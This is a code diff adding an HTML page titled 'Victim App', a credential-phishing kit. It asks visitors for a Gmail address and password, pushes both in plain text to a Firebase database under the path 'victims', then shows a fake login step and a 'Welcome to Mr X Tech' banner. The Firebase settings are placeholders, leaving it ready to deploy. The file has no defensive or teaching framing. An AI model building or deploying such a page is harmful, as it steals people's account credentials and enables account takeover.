@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Victim App</title>
+  <style>
+    body { text-align: center; padding-top: 100px; font-family: sans-serif; }
+    #login, #signup { display: none; }
+  </style>
+</head>
+<body>
+
+  <div id="start">
+    <h1>Welcome</h1>
+    <button onclick="showSignUp()">Start</button>
+  </div>
+
+  <div id="signup">
+    <h2>Sign Up</h2>
+    <input type="email" id="email" placeholder="Enter Gmail"><br><br>
+    <input type="password" id="password" placeholder="Enter Password"><br><br>
+    <button onclick="showLogin()">Sign Up</button>
+  </div>
+
+  <div id="login">
+    <h2>Login</h2>
+    <input type="email" id="loginEmail" placeholder="Enter Gmail"><br><br>
+    <input type="password" id="loginPassword" placeholder="Enter Password"><br><br>
+    <button onclick="login()">Login</button>
+  </div>
+
+  <div id="final" style="display:none; background:black; color:white; height:100vh;">
+    <h1>Welcome to Mr X Tech...</h1>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_PROJECT.firebaseapp.com",
+      databaseURL: "https://YOUR_PROJECT.firebaseio.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT.appspot.com",
+      messagingSenderId: "ID",
+      appId: "APP_ID"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function showSignUp() {
+      document.getElementById("start").style.display = "none";
+      document.getElementById("signup").style.display = "block";
+    }
+
+    function showLogin() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      // Save to database
+      db.ref("victims").push({ email, password });
+      document.getElementById("signup").style.display = "none";
+      document.getElementById("login").style.display = "block";
+    }
+
+    function login() {
+      document.body.innerHTML = '<div style="background:black; color:white; height:100vh; display:flex; justify-content:center; align-items:center;"><h1>Welcome to Mr X Tech...</h1></div>';
+    }
+  </script>
+</body>
+      </html>
